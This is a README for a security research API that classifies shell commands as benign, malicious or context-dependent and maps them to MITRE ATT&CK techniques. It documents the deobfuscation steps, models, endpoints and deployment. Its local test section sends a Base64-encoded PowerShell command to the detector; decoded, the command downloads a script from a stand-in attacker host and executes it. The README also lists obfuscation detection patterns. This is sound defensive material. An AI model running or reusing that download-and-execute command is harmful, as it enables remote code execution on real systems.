# Genos API

Genos is a two-stage neural pipeline for real-time malicious command detection and MITRE ATT&CK technique attribution, served as a REST API over Gunicorn and Flask.

The system was developed as part of an IEEE research programme. See the [scientific validation report](artifacts/scientific_validation/REPORT.md) for measured results and unresolved validity gaps.

---

## How the engine works

The core inference logic lives in `engine.py`. The Flask API in `app.py` wraps it.

### Startup

When the process starts:

1. `python-dotenv` loads `.env` from the working directory.
2. `GenosEngine` is constructed once — no hot-reloading of models.
3. The engine resolves its asset paths in this order for each file:
   - absolute path (if given)
   - relative to `os.getcwd()`
   - relative to the directory containing `engine.py`
   - each fallback candidate in turn
4. The specialist label map is loaded from the first file that exists:
   - `map_path` argument passed by the caller
   - `config/specialist_map.json` ← current live path
   - `models/specialist_map.json`
   - If none found: built dynamically by reading `mitre_id` values from the raw MITRE CSV and sorting them
5. `RobertaTokenizer` is loaded from `microsoft/codebert-base` (downloaded on first run, cached by HuggingFace).
6. Both model checkpoints are loaded with `torch.load(..., weights_only=True)`.
7. The app calls `engine.scan("warmup")` before accepting traffic; `/health` returns `{"status": "ok"}` once this completes.

### Deobfuscation pipeline

Before tokenisation, `scan()` applies an entropy-aware deobfuscation loop. A command is treated as obfuscated if it matches any of these patterns (case-insensitive regex) or if its Shannon entropy exceeds **5.2 bits**:

| Pattern | What it catches |
|---|---|
| `\[char\]` | PowerShell character-code constructions |
| `base64` / `frombase64` | Inline Base64 references |
| `reverse\(` | String reversal wrappers |
| `\+[ ]*'` | String concatenation fragments |
| `\$[a-z0-9_]{10,}` | Long obfuscated variable names |
| `\\x[0-9a-f]{2}` | Hex byte escapes |

If obfuscated, the engine runs up to **5 deobfuscation passes**. Each pass applies, in order:

1. **`universal_decoder`** — decodes the whole string if it matches a bare Base64 regex
2. **`decode_embedded_base64`** — decodes `FromBase64String('...')` payloads inline
3. **`extract_powershell_payload`** — extracts the payload from `&(builder)(payload)` invocation wrappers, including `[System.Text.Encoding]::UTF8.GetString(...)` variants
4. **`deobfuscate_char_constructions`** — resolves `[char]65`, `(65..67) | % { [char]$_ }`, and mixed range+bareword patterns into literal characters
5. **`clean_concatenation`** — collapses `"ab" + "cd"` and `"ab" + bareword` forms
6. **`pyminusone.deobfuscate(..., lang="powershell")`** — optional AST-level simplification if `pyminusone` is installed; silently skipped otherwise
7. Runs char and concatenation passes again after any AST simplification

The loop terminates early when:
- a pass produces no change in the text
- the absolute entropy delta between passes is less than `0.01` bits

After the loop, the processed command is **lowercased and stripped** before tokenisation.

### Tokenisation

Uses `RobertaTokenizer` from `microsoft/codebert-base`:

- `max_length`: `256` (override with `GENOS_MAX_TOKENS` env var)
- `padding`: `max_length`
- `truncation`: enabled
- `return_tensors`: `"pt"`

### Tier 1 — Gatekeeper (3-class neural classifier)

Architecture:

```
CodeBERT CLS token (768-d)
→ Dropout(0.2)
→ Linear(768, 1024)
→ GELU
→ Dropout(0.2)
→ Linear(1024, 3)
```

Inference runs under `torch.no_grad()` and `torch.amp.autocast`:
- CUDA device: `float16`
- CPU device: `bfloat16`

The model outputs three class probabilities mapped as:

| Model index | Internal label | Public label |
|---|---|---|
| 0 | Benign | Benign |
| 1 | Malicious | Malicious |
| 2 | Context_Dependent | Context_Dependent |

The final verdict is the model's top class after the declared view policy. `Context_Dependent` is preserved in the API and means additional context is required. Regex features provide extracted evidence and explicit heuristic baselines.

The default `GENOS_VIEW_POLICY=mean` averages raw and decoded score distributions when decoding changes the command. `raw` and `decoded` are available for controlled experiments. This choice is not claimed to be empirically optimal. All commands receive behavior and MITRE analysis.

Scores are uncalibrated model estimates unless a validation-fitted, model-bound `GENOS_CALIBRATION_PATH` is supplied. Legacy `confidence` fields use percentages (0–100); `score_type` declares their interpretation. Behavior action tags use the reported `GENOS_BEHAVIOR_ACTION_THRESHOLD` (default 0.5), which has not yet been selected on independent labels.

Checkpoints load strictly. Behavior load failures stop initialization unless `GENOS_ALLOW_BEHAVIOR_FALLBACK=1` explicitly permits the reported heuristic baseline. Responses include model/implementation hashes, representation, preprocessing policy, fallback status, and truncation flags.

See [scientific validation workflow](docs/scientific_validation.md) for the audit, grouped datasets, experiments, annotation protocol, and remaining limitations. Existing benchmark scores are development evidence and do not establish independent operational accuracy.

### Tier 2 — Specialist (TF-IDF char n-gram + Random Forest)

MITRE ranking and the behavior encoder **always run**, regardless of the verdict. Measure latency on the deployment hardware; unconditional behavior adds neural inference work.

Model file: `models/specialist_tfidf_char_rf.pkl` (scikit-learn pipeline, loaded with `joblib`).

Input text is built by `_build_variant_a_text()`, which calls the `parser/` module to produce a structured "Variant A" representation of the command:

```
RAW: <command with original case>
RESIDUAL: <parser-extracted residual tokens>
FEATURES: <parser/rule tags, when present>
```

When decoding changes the command, the configured view policy combines normalized distributions (mean by default). MITRE returns up to five ranked candidates; this ranker does not yet support a learned no-technique class.

Classes come from `config/specialist_map.json`; the saved classifier may cover only a subset of the map. The pipeline's integer class indices are mapped back to MITRE IDs via `_tfidf_idx_to_label`.

### Engine output schema

`GenosEngine.scan()` returns:

```json
{
  "label": "Malicious",
  "label_confidence": 99.81,
  "score_type": "uncalibrated_model_estimate",
  "deobfuscated_cmd": "invoke-expression ...",
  "MITRE_codes": [
    { "code": "T1059", "confidence": 97.43 },
    { "code": "T1021", "confidence": 1.22 },
    { "code": "T1078", "confidence": 0.81 },
    { "code": "T1003", "confidence": 0.48 },
    { "code": "T1087", "confidence": 0.06 }
  ]
}
```

For obfuscated commands with a decoded payload, the decoded text is also reported:

```json
{
  "decoded_payload": "<deobfuscated text>"
}
```

For `Context_Dependent` labels:

```json
{
  "label": "Context_Dependent",
  "action": "requires_context",
  ...
}
```

Notes:
- `label` is one of: `Benign`, `Malicious`, `Context_Dependent`
- `label_confidence` is a percentage-valued model score (0–100) in both the engine and HTTP response; inspect `score_type` for calibration status
- `MITRE_codes` contains up to five ranked candidates on every response; there is currently no learned no-technique decision
- `deobfuscated_cmd` is `null` when the input was not flagged as obfuscated

---

## Models

Tier 1 uses a CodeBERT neural model. Tier 2 uses a TF-IDF char n-gram + Random Forest sklearn pipeline.

| File | Purpose |
|---|---|
| `models/gatekeeper.pt` | Tier 1 — 3-class CodeBERT gatekeeper (Benign / Context_Dependent / Malicious) |
| `models/specialist_tfidf_char_rf.pkl` | Tier 2 — active MITRE attribution model (char n-gram TF-IDF + RF) |
| `models/archive/specialist_tfidf_rf.pkl` | Archived Tier 2 word-level TF-IDF + RF alternative |
| `config/specialist_map.json` | Maps integer class indices to MITRE technique IDs |
| `config/gatekeeper_meta.json` | Gatekeeper class-map and training metadata read at startup |

Model files are local runtime assets and are excluded from Git by `.gitignore`; provide the active checkpoint files separately when deploying. Historical and experimental checkpoints are grouped under `models/archive/`, and retraining outputs go under `models/experiments/`.

---

## Provenance-first benign collection

Tier 1 repair work should prefer real benign operational provenance over synthetic patch rows.

Use [scripts/data/build_real_benign_provenance_corpus.py](scripts/data/build_real_benign_provenance_corpus.py) with a manifest like [config/benign_provenance_sources.template.json](config/benign_provenance_sources.template.json) to:

1. ingest real benign sources such as shell history, official docs examples, or runbook exports
2. preserve `source_type`, `label_basis`, `provenance_source`, `source_uri`, and `holdout_group` per row
3. deduplicate against the existing Tier 1 train/val/test CSVs and existing benign patch JSONLs
4. split the accepted corpus into train and a never-train-on real-benign holdout benchmark

Example:

```bash
cd /home/sam/genos/genos_api
source venv/bin/activate

python3 scripts/data/build_real_benign_provenance_corpus.py \
  --manifest config/benign_provenance_sources.json \
  --output-stem gatekeeper_real_benign_v1
```

This produces:

- `data/training/genos_dataset/gatekeeper_real_benign_v1_train.jsonl`
- `data/training/genos_dataset/gatekeeper_real_benign_v1_holdout.jsonl`
- `data/training/genos_dataset/gatekeeper_real_benign_v1_manifest.json`

Evaluate an independently collected holdout with `scripts/evaluation/evaluate_pipeline.py`, supplying every training source with `--training-data`. The exporter rejects detected command/group overlap. A file called “holdout” alone is not evidence that a checkpoint has never seen its examples.

The intent is scientific separation:

- `Benign`: observed routine operational provenance
- `Context_Dependent`: command text alone is ambiguous
- `Malicious`: direct abuse evidence or attack provenance

---

## API

Served by Gunicorn on `127.0.0.1:6001` by default.

### `GET /health`

```json
{ "status": "ok" }
```

Returns `"loading"` if the engine warm-up has not yet completed.

### `POST /scan` — MongoDB-authenticated

Requires a running MongoDB instance configured via `MONGO_URI`. API keys are stored in the `genos.api_keys` collection; usage is tracked in `genos.usage`.

Request:

```json
{
  "api_key": "YOUR_KEY",
  "command": "net user /domain"
}
```

The API key is read from the JSON body, **not** from a header. The command may be plain text or a Base64-encoded string; `app.py` attempts a full Base64 decode before passing to the engine, falling back to plain text if decode fails.

Response (malicious):

```json
{
  "label": "Malicious",
  "label_confidence": 99.81,
  "MITRE_codes": [
    { "code": "T1087", "confidence": 97.43 },
    { "code": "T1069", "confidence": 1.22 }
  ]
}
```

Response (benign):

```json
{
  "label": "Benign",
  "label_confidence": 99.99,
  "MITRE_codes": []
}
```

Error responses:

| Status | Meaning |
|---|---|
| `400` | Missing `api_key` or `command` |
| `401` | API key not found in MongoDB |
| `500` | Engine error |
| `503` | `MONGO_URI` not configured |

### `POST /scan/internal` — token-gated, no database

Intended for local testing, CI, and benchmark scripts where MongoDB is not required.

Request:

```json
{
  "command": "whoami",
  "internal_token": "optional"
}
```

`internal_token` is only enforced when `INTERNAL_TEST_TOKEN` is set in the environment. Omit the field entirely when the env var is unset.

Response shape is identical to `/scan`.

---

## Setup and venv

### Create a fresh virtual environment

Always use a dedicated `venv` rather than the system Python or any checked-in environment directory. The project `.gitignore` already excludes `venv/` and `my_flask_env/`.

```bash
cd genos_api
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip setuptools wheel
```

Use `.venv` (or any name that `.gitignore` covers) rather than `venv` if you want the directory ignored automatically. The existing `.gitignore` entry covers `venv/` literally.

### Install dependencies

```bash
pip install -r requirements.txt
```

**PyTorch and CUDA:** `requirements.txt` pins the major/minor version of PyTorch but not the CUDA wheel suffix, because the suffix is machine-specific. If you need a specific CUDA build, install it first from the official index before running the above:

```bash
# Example: CUDA 12.1 build
pip install torch==2.5.1+cu121 --index-url https://download.pytorch.org/whl/cu121
pip install -r requirements.txt
```

CPU-only inference works without any CUDA toolkit; the engine auto-detects the device and uses `bfloat16` autocast on CPU.

**Optional — PowerShell deobfuscation enhancement:**

```bash
pip install pyminusone
```

If `pyminusone` is not installed the engine falls back to its built-in deobfuscation rules silently.

### Configure environment

```bash
cp .env.example .env
# edit .env with your values
```

---

## Environment variables

| Variable | Used in | Default | Purpose |
|---|---|---|---|
| `MONGO_URI` | `app.py` | — | Connection string for MongoDB; enables `/scan` route |
| `INTERNAL_TEST_TOKEN` | `app.py` | — | Optional auth token for `/scan/internal`; unenforced if unset |
| `GENOS_API_BIND` | `gunicorn.conf.py` | `127.0.0.1:6001` | Gunicorn bind address |
| `GENOS_VIEW_POLICY` | `engine.py` | `mean` | Raw/decoded distribution fusion policy |
| `GENOS_CALIBRATION_PATH` | `engine.py` | unset | Validation-fitted artifact bound to the runtime |
| `GENOS_BEHAVIOR_POLICY_PATH` | `engine.py` | unset | Validation-selected per-action thresholds |
| `GENOS_ALLOW_BEHAVIOR_FALLBACK` | `engine.py` | `0` | Explicitly allow reported heuristic fallback |
| `GENOS_MAX_TOKENS` | `engine.py` | `256` | Tokeniser max sequence length |
| `CURRENT_TIME` | `app.py` | `"2026-03-17T00:00:00.000+00:00"` | Timestamp written into Mongo usage records |
| `GENOS_T1_EFFECTIVE_BATCH` | `trainer1.py` | `256` | Training only: effective batch size |
| `GENOS_T1_MICRO_BATCH` | `trainer1.py` | `32` | Training only: micro-batch size for gradient accumulation |
| `GENOS_T1_USE_COMPILE` | `trainer1.py` | `0` | Training only: set `1` to enable `torch.compile()` |

---

## Running locally

### Start the API

```bash
source .venv/bin/activate
gunicorn -c gunicorn.conf.py app:app
```

The worker loads both CodeBERT models and runs a warm-up pass before accepting traffic. The 300 s Gunicorn timeout covers this load time. On a machine with a GPU and the model weights already cached locally, startup typically takes under 60 s.

### Test without MongoDB

```bash
curl -s http://127.0.0.1:6001/health

curl -s -X POST http://127.0.0.1:6001/scan/internal \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'

curl -s -X POST http://127.0.0.1:6001/scan/internal \
  -H "Content-Type: application/json" \
  -d '{"command": "powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBjAG8AbQAvAG0AYQBsAHcAYQByAGUALgBzAGgAIAB8ACAASQBFAFgA"}'
```

### Reload an already-running instance

```bash
bash scripts/ops/reload_api.sh reload   # stop → start → health check
bash scripts/ops/reload_api.sh status   # check /health
```

The reload script is hardcoded to `127.0.0.1:6001` and activates `venv/bin/activate` relative to the project root.

### Run the engine directly from Python

```python
import sys
sys.path.insert(0, "/path/to/genos_api")

from engine import GenosEngine

engine = GenosEngine()
result = engine.scan("net localgroup administrators")
print(result)
```

---

## Deployment

### Gunicorn configuration (`gunicorn.conf.py`)

| Setting | Value | Reason |
|---|---|---|
| `bind` | `127.0.0.1:6001` | Loopback only; expose via reverse proxy |
| `workers` | `1` | One model copy in GPU memory; more workers multiplies VRAM usage |
| `worker_class` | `sync` | CUDA cannot survive a post-fork environment |
| `timeout` | `300` | Covers model loading on startup |
| `preload_app` | not set | Omitted deliberately; pre-loading would fork after CUDA initialisation |

### Reverse proxy (recommended)

Run Gunicorn on localhost and expose Nginx (or Caddy) publicly. Never bind Gunicorn directly to `0.0.0.0` in production without a reverse proxy.

Minimal Nginx location block:

```nginx
location /scan {
    proxy_pass http://127.0.0.1:6001;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_read_timeout 60s;
}
```

### systemd unit

```ini
[Unit]
Description=Genos API
After=network.target

[Service]
Type=simple
User=genos
WorkingDirectory=/opt/genos_api
EnvironmentFile=/opt/genos_api/.env
ExecStart=/opt/genos_api/.venv/bin/gunicorn -c gunicorn.conf.py app:app
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

---

## Evaluation and research tooling

The deleted `scripts/benchmark` directory remains retired. Current tools live in `scripts/evaluation`; commands and annotation instructions are in the [scientific validation workflow](docs/scientific_validation.md).

| Script | Purpose |
|---|---|
| `scripts/evaluation/evaluate_pipeline.py` | Export model scores with exposure checks and provenance |
| `scripts/evaluation/compare_ablations.py` | Paired comparisons with group-bootstrap intervals |
| `scripts/evaluation/compare_view_policies.py` | Compare raw, decoded, mean, and retired risk-selection policies |
| `scripts/evaluation/calibrate_scores.py` | Fit temperature on validation and assess held-out test scores |
| `scripts/evaluation/select_action_thresholds.py` | Select per-action thresholds using validation data |
| `scripts/evaluation/audit_annotations.py` | Reconcile independent reviews and explicit adjudication |
| `scripts/evaluation/smoke_runtime.py` | Check real checkpoint/API integration and record predictions |
| `scripts/training/trainer1.py` | Train the three-class gatekeeper on audited grouped splits |
| `scripts/training/train_behavior_encoder.py` | Train raw or structured behavior representations |
| `scripts/training/trainer_tfidf.py` | Train raw or structured MITRE RF baselines |

These trainers default to the prepared task directories under `data/derived/scientific_v2/` and write isolated experiments under `models/experiments/`. Original legacy data remains under `data/training/`. Labels are still weak supervision until independent reviews are completed.

---

## Repository layout

```
app.py                              Flask application and route handling
engine.py                           GenosEngine — deobfuscation and two-tier inference
scientific_validation.py            Shared dataset audits and evaluation metrics
gunicorn.conf.py                    Gunicorn runtime configuration
requirements.txt                    Python dependencies
.env.example                        Environment variable template

config/
  specialist_map.json               MITRE technique → integer label map
  definitive_mitre_map.json         Full MITRE technique reference
  label_map.json                    Human-readable label definitions
  gatekeeper_meta.json              Active gatekeeper metadata
  meta/                             Historical training metadata and config snapshots

models/
  gatekeeper.pt                     Active Tier 1 checkpoint
  behavior_encoder.pt               Active behavior checkpoint
  specialist_tfidf_char_rf.pkl      Active MITRE ranker
  archive/                          Historical and experimental model files
  experiments/                      Isolated retraining runs and metadata

data/
  training/                         Source and legacy datasets, grouped by task/version
    genos_dataset/                  Gatekeeper datasets and supervised patches
    genos_behavior/                 Behavior labels
    genos_residual_expanded/        MITRE specialist dataset
    genos_cache/                    Cached source data
  derived/                          Prepared splits and local review data (gitignored)
  provenance/raw/                   Source provenance material

artifacts/
  scientific_validation/            Compact audits, reports, and experiment summaries
  demo/                              UI verification artifacts

docs/
  scientific_validation.md          Data, training, and evaluation workflow

parser/                             Command parsing and rule engine module
  parser.py                         Main parser entry point
  rule_engine.py                    Rule-based pre-classification
  deobfuscator.py                   Standalone deobfuscation logic
  semantic_features.py              Feature extraction helpers
  candidate_mask.py                 Candidate MITRE label masking
  residual_text.py                  Residual text extraction
  build_*.py                        Dataset builder scripts
  eval_*.py                         Parser evaluation scripts
  validate_*.py                     Validation harnesses
  parser_gold.jsonl                 Gold-label evaluation set
  parser_schema.json                Parser output schema

scripts/
  data/                              Dataset preparation and augmentation
  evaluation/                        Runtime tests, benchmarks, audits, and calibration
  ops/                               Review and training orchestration
  training/
    trainer1.py                     Gatekeeper training script
    trainer2_hybrid.py              Specialist hybrid training script
    trainer_tfidf.py                TF-IDF baseline training
    generate_cli_specialist_dataset.py  CLI-specific dataset generation

logs/                               Local generated output (gitignored)
  training/                          Trainer and data-build logs
  benchmarks/                        Model benchmark reports and plots
  ablation/                          Ablation run outputs
  decomposition/                     Gatekeeper decomposition runs
  real_benign_holdout/                Real-benign holdout results
  soft_label_v0/                      Soft-label experiments
  tier1_sanity/                       Tier 1 sanity checks
  tier1_stress/                       Tier 1 stress runs
```

---

## Security considerations for public deployment

- `.env` is excluded by `.gitignore`; never commit real secrets
- `/scan` requires a valid API key checked against MongoDB; no unauthenticated inference path exists on that route
- `/scan/internal` bypasses the database and should not be exposed publicly; keep it behind a firewall or protect it with `INTERNAL_TEST_TOKEN`
- Gunicorn is bound to loopback only; the reverse proxy is responsible for TLS termination and rate limiting
- The deobfuscation loop is bounded to 5 passes with an entropy-delta early-exit to prevent deobfuscation bombs from causing unbounded processing
- Model weights are loaded with `weights_only=True` to prevent arbitrary code execution via malicious checkpoint files

---

## Citing this work

If you use Genos in your research, please cite the associated IEEE paper.
